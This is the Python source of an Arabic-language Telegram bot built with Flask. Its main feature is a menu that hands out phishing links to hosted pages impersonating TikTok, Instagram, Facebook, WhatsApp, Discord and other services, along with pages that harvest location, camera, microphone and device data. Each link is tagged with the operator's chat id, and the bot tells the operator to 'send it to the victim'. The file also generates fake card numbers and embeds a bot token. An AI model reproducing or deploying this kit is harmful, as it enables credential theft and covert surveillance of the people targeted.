import os, sys, subprocess, time, threading, random, string, json, base64, logging, io, uuid
import requests
from datetime import datetime

# ========== تثبيت المكتبات المفقودة تلقائياً ==========
def ensure_module(package, import_name=None):
    name = import_name or package
    try:
        __import__(name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

ensure_module("flask")
ensure_module("requests")
ensure_module("pyTelegramBotAPI", "telebot")
ensure_module("gTTS", "gtts")
ensure_module("qrcode", "qrcode")
ensure_module("PIL", "PIL")
ensure_module("pyshorteners", "pyshorteners")

from flask import Flask, request
from telebot import TeleBot, types
from io import BytesIO

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيق البوت

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)
user_states = {}
bot_rating = 0

# ========== الصفحات الاحتيالية (17 زر) ==========
PHISH_PAGES = [
    ("🎵 تيك توك", "tiktok.html"),       ("📷 انستقرام", "instagram.html"),
    ("👻 سناب شات", "snapchat.html"),     ("📘 فيسبوك", "facebook.html"),
    ("💬 واتساب", "whatsapp.html"),       ("✈️ تيليجرام", "telegram.html"),
    ("🐦 تويتر", "twitter.html"),         ("▶️ يوتيوب", "youtube.html"),
    ("🎮 ديسكورد", "discord.html"),       ("🤖 ريدت", "reddit.html"),
    ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
    ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
    ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
    ("📱 فحص مواصفات الجهاز", "device.html")
]

# ========== دوال مساعدة ==========
def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_visa():
    prefixes = ["4", "5", "37", "34"]
    prefix = random.choice(prefixes)
    length = 16 if prefix in ["4", "5"] else 15
    while len(prefix) < length: prefix += str(random.randint(0, 9))
    exp_month = str(random.randint(1, 12)).zfill(2)
    exp_year = str(random.randint(2025, 2030))
    cvv = str(random.randint(100, 999))
    return f"💳 رقم: {prefix}\n📅 تاريخ: {exp_month}/{exp_year}\n🔒 CVV: {cvv}"

def shorten_url(url):
    try:
        s = pyshorteners.Shortener()
        return s.tinyurl.short(url)
    except:
        try:
            r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
            if r.status_code == 200: return r.text.strip()
        except: pass
    return url

def text_to_speech(text, lang='ar'):
    try:
        from gtts import gTTS
        tts = gTTS(text, lang=lang)
        buf = BytesIO()
        tts.write_to_fp(buf)
        buf.seek(0)
        return buf
    except: return None

def generate_qr_code(data):
    try:
        import qrcode
        qr = qrcode.QRCode(version=1, box_size=10, border=4)
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buf = BytesIO()
        img.save(buf, 'PNG')
        buf.seek(0)
        return buf
    except: return None

def read_qr_from_image(file_bytes):
    try:
        from pyzbar.pyzbar import decode
        from PIL import Image
        img = Image.open(BytesIO(file_bytes))
        decoded = decode(img)
        if decoded: return decoded[0].data.decode('utf-8')
        else: return None
    except: return None

def check_url_virustotal(url):
    try:
        api_key = "YOUR_VIRUSTOTAL_API_KEY"  # ضع مفتاح VirusTotal الخاص بك
        headers = {"x-apikey": api_key}
        resp = requests.post("https://www.virustotal.com/api/v3/urls", data={"url": url}, headers=headers, timeout=10)
        if resp.status_code == 200:
            analysis_id = resp.json()['data']['id']
            # ننتظر قليلاً ثم نجلب النتيجة
            time.sleep(10)
            analysis = requests.get(f"https://www.virustotal.com/api/v3/analyses/{analysis_id}", headers=headers, timeout=10)
            if analysis.status_code == 200:
                stats = analysis.json()['data']['attributes']['stats']
                return f"✅ فحص الرابط:\n🔵 غير ضار: {stats['harmless']}\n🟡 مشبوه: {stats['suspicious']}\n🔴 خبيث: {stats['malicious']}"
        return "❌ فشل الفحص، تأكد من المفتاح أو الرابط"
    except: return "❌ فشل الاتصال بخدمة الفحص"

def decorate_text(text):
    # محاكاة بسيطة للزخرفة باستخدم استبدال الحروف
    replacements = {
        'ا': 'أ', 'ب': 'بـ', 'ت': 'تـ', 'ث': 'ثـ', 'ج': 'جـ', 'ح': 'حـ', 'خ': 'خـ',
        'د': 'د', 'ذ': 'ذ', 'ر': 'ر', 'ز': 'ز', 'س': 'سـ', 'ش': 'شـ', 'ص': 'صـ',
        'ض': 'ضـ', 'ط': 'طـ', 'ظ': 'ظـ', 'ع': 'عـ', 'غ': 'غـ', 'ف': 'فـ', 'ق': 'قـ',
        'ك': 'كـ', 'ل': 'لـ', 'م': 'مـ', 'ن': 'نـ', 'ه': 'هـ', 'و': 'و', 'ي': 'يـ'
    }
    return ''.join(replacements.get(c, c) for c in text)

def create_temp_email():
    try:
        s = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0'}
        r = s.get('https://api.mail.tm/domains', headers=headers)
        domain = r.json()['hydra:member'][0]['domain']
        email = ''.join(random.choice(string.ascii_lowercase) for _ in range(10)) + "@" + domain
        pwd = generate_password(12)
        s.post('https://api.mail.tm/accounts', json={'address': email, 'password': pwd}, headers=headers)
        return f"📧 البريد: {email}\n🔑 كلمة المرور: {pwd}"
    except: return "فشل إنشاء بريد مؤقت"

# ========== Webhook ==========
@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except Exception as e:
            logging.error(f"Webhook error: {e}")
            return ''
    return '!', 403

@app.route("/health")
def health(): return "OK", 200

# ========== لوحة الأوامر الرئيسية ==========
@bot.message_handler(commands=['start'])
def start(msg):
    chat_id = msg.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)

    # الصفوف الاحتيالية
    for i in range(0, len(PHISH_PAGES) - 1, 2):
        left = PHISH_PAGES[i]; right = PHISH_PAGES[i+1]
        markup.row(types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
                   types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}"))
    last = PHISH_PAGES[-1]
    markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))

    # صف الأدوات
    markup.row(types.InlineKeyboardButton("🔊 نص إلى صوت", callback_data="tts"),
               types.InlineKeyboardButton("✨ زخرفة نصوص", callback_data="decor"))

    markup.row(types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten"),
               types.InlineKeyboardButton("🔐 توليد كلمة سر", callback_data="genpass"))

    markup.row(types.InlineKeyboardButton("🌐 ترجمة", callback_data="translate"),
               types.InlineKeyboardButton("📧 بريد وهمي", callback_data="tempmail"))

    markup.row(types.InlineKeyboardButton("🔍 فحص رابط", callback_data="checklink"),
               types.InlineKeyboardButton("📸 إنشاء باركود", callback_data="createqr"))

    markup.row(types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"),
               types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"))

    markup.row(types.InlineKeyboardButton("🆔 معرفي", callback_data="myid"),
               types.InlineKeyboardButton("📜 نصائح", callback_data="tips"))

    markup.row(types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"),
               types.InlineKeyboardButton("📄 شروط", callback_data="terms"))

    markup.row(types.InlineKeyboardButton("📖 شرح البوت", callback_data="help"),
               types.InlineKeyboardButton("⭐ تقييم", callback_data="rate"))

    bot.send_message(chat_id, "🔱 <b>GNRAL BOT</b>\n\nاختر الخدمة:", parse_mode="HTML", reply_markup=markup)

# ========== معالج الأزرار ==========
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id; data = call.data; msg_id = call.message.message_id

    # الصفحات الاحتيالية
    if data.startswith("ph|"):
        page = data.split("|")[1]
        link = f"{BASE_URL}/{page}?chat={chat_id}"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية.", chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif data == "back":
        start(call.message)  # إعادة القائمة الرئيسية

    # الأدوات الفعلية
    elif data == "tts":
        user_states[chat_id] = "tts"; bot.send_message(chat_id, "🎙️ أرسل النص لتحويله إلى صوت:")
    elif data == "decor":
        user_states[chat_id] = "decor"; bot.send_message(chat_id, "✨ أرسل النص لزخرفته:")
    elif data == "shorten":
        user_states[chat_id] = "shorten"; bot.send_message(chat_id, "🔗 أرسل الرابط:")
    elif data == "genpass":
        bot.send_message(chat_id, f"🔐 كلمة المرور:\n<code>{generate_password()}</code>", parse_mode="HTML")
    elif data == "translate":
        user_states[chat_id] = "translate"; bot.send_message(chat_id, "🌐 أرسل النص:")
    elif data == "tempmail":
        bot.send_message(chat_id, create_temp_email())
    elif data == "checklink":
        user_states[chat_id] = "checklink"; bot.send_message(chat_id, "🔍 أرسل الرابط:")
    elif data == "createqr":
        user_states[chat_id] = "createqr"; bot.send_message(chat_id, "📸 أرسل النص لإنشاء باركود:")
    elif data == "readqr":
        user_states[chat_id] = "readqr"; bot.send_message(chat_id, "📷 أرسل صورة الباركود:")
    elif data == "visa":
        bot.send_message(chat_id, generate_fake_visa())
    elif data == "myid":
        bot.send_message(chat_id, f"🆔 معرفك: {call.from_user.id}")
    elif data == "tips":
        bot.send_message(chat_id, "📜 <b>نصائح</b>\n\n1. لا تشارك بياناتك مع أحد.\n2. استخدم كلمات مرور قوية.\n3. فعّل التحقق بخطوتين.")
    elif data == "hack":
        bot.send_message(chat_id, "💻 <b>كيف تصبح هاكر</b>\n\n1. Linux\n2. Python\n3. شبكات\n4. ثغرات الويب\n5. منصات تدريب (HTB, THM)")
    elif data == "terms":
        bot.send_message(chat_id, "📜 <b>شروط الاستخدام</b>\n\n✅ للاستخدام المشروع فقط.\n⚠️ المستخدم يتحمل المسؤولية.")
    elif data == "help":
        bot.send_message(chat_id, "📖 <b>شرح البوت</b>\n\nأزرار الصفحات تعطيك روابط تصيد. باقي الأزرار تعمل داخل تلغرام مباشرة.")
    elif data == "rate":
        global bot_rating
        bot_rating += 1
        bot.send_message(chat_id, f"⭐ شكراً! عدد التقييمات: {bot_rating}")
    bot.answer_callback_query(call.id)

# ========== معالج النصوص التفاعلية ==========
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "tts")
def handle_tts(m):
    user_states.pop(m.chat.id, None)
    audio = text_to_speech(m.text)
    if audio:
        bot.send_voice(m.chat.id, audio)
    else:
        bot.send_message(m.chat.id, "فشل التحويل إلى صوت")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "decor")
def handle_decor(m):
    user_states.pop(m.chat.id, None)
    bot.send_message(m.chat.id, decorate_text(m.text))

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "shorten")
def handle_shorten(m):
    user_states.pop(m.chat.id, None)
    short = shorten_url(m.text)
    bot.send_message(m.chat.id, f"🔗 الرابط المختصر:\n{short}" if short else "فشل الاختصار")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "translate")
def handle_translate(m):
    user_states.pop(m.chat.id, None)
    bot.send_message(m.chat.id, f"🌐 النص المترجم:\n{m.text}")  # تحتاج مكتبة ترجمة حقيقية

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "checklink")
def handle_checklink(m):
    user_states.pop(m.chat.id, None)
    result = check_url_virustotal(m.text)
    bot.send_message(m.chat.id, result)

@bot.message_handler(content_types=['photo'])
def handle_photo(m):
    if user_states.get(m.chat.id) == "readqr":
        user_states.pop(m.chat.id, None)
        file_info = bot.get_file(m.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        result = read_qr_from_image(downloaded)
        bot.send_message(m.chat.id, result if result else "لم يتم التعرف على باركود")
    elif user_states.get(m.chat.id) == "createqr":
        # إنشاء باركود لا يعتمد على الصورة
        pass

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "createqr")
def handle_createqr(m):
    user_states.pop(m.chat.id, None)
    qr = generate_qr_code(m.text)
    if qr:
        bot.send_photo(m.chat.id, qr)
    else:
        bot.send_message(m.chat.id, "فشل إنشاء الباركود")

# ========== Keep-Alive ==========
def keep_alive():
    while True:
        time.sleep(120)
        try: requests.get(f"{APP_URL}/health", timeout=5)
        except: pass

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))